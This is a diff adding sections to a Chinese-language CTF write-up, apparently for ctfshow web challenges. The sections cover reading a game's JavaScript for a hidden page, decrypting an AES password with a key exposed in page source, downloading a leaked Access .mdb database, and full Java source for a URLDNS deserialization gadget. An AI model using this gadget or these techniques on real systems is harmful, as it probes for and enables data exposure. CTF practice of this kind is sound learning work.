@@ -1027,6 +1027,56 @@ sql备份泄漏
 
 ![image-20241112205527202](./assets/image-20241112205527202.png)
 
+#### web18
+
+本题是一个游戏，玩到101分就能得到flag
+
+我们直接看js
+
+Flappy_js.js
+
+![image-20241113125910231](assets/image-20241113125910231.png)
+
+审一下代码，我们可以看到当分数大于100的时候会输出这段文字，这段文字看着像unidcode编码，解码试试
+
+![image-20241113130107163](assets/image-20241113130107163.png)
+
+根据提示访问url/110.php,得到flag
+
+#### web19
+
+题目是一个登录的页面，根据hint查看网页源代码
+
+![image-20241113132533968](assets/image-20241113132533968.png)
+
+根据提示，这道题应该是一道对密码进行了加密的题目
+
+审阅一下代码我们得到这些信息
+
+> mode模式： CBC padding 填充方式： ZeroPadding
+> 密文输出编码： 十六进制hex 偏移量iv: ilove36dverymuch 密钥：0000000372619038
+> 密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04
+
+[AES 加密/解密 - 锤子在线工具](https://www.toolhelper.cn/SymmetricEncryption/AES)
+
+用解密工具解密一下密文我们可以得到密码为
+
+![image-20241113133003036](assets/image-20241113133003036.png)
+
+输入密码，得到flag
+
+#### web20
+
+> hint：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。
+
+这是一个使用access数据库的asp程序
+
+根据提示本题存在mdb文件泄露，那我们直接访问url/db/db.mdb
+
+下载db.mdb文件后用记事本打开搜索flag，即可得到 flag{ctfshow_old_database}
+
+![image-20241113134305246](assets/image-20241113134305246.png)
+
 ### **命令执行**：
 
 #### web29
@@ -1517,3 +1567,46 @@ payload：
 关于无参命令执行的一些解释
 
 ![image-20241109165447576](assets/202411091654772.png)
+
+### **Java反序列化：**
+
+#### web846
+
+URLDNS
+
+payload：
+
+```java
+import java.io. *;
+import java.lang.reflect.Field;
+import java.util.*;
+import java.net.URL;
+import java.util.HashMap;
+
+
+public class URLDNS {
+    public static void serialize(Object obj) throws IOException{
+        ByteArrayOutputStream data =new ByteArrayOutputStream();
+        ObjectOutput oos =new ObjectOutputStream(data);
+        oos.writeObject(obj);
+        oos.flush();
+        oos.close();
+        System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));
+    };
+    public static void main(String[] args) throws Exception{
+        HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
+        URL url = new URL("https://78c78067-c876-40fb-b175-edb3b743655d.challenge.ctf.show/");
+        Class c = url.getClass();
+        Field hashcodefield = c.getDeclaredField("hashCode");
+        hashcodefield.setAccessible(true);
+//          不想这里发起请求，把url对象的hashcode改成不是-1
+        hashcodefield.set(url,911);
+        hashmap.put(url,1);
+        hashcodefield.set(url,-1);
+//          这里把hashcode改回-1
+
+        serialize(hashmap);
+    }
+}
+```
+
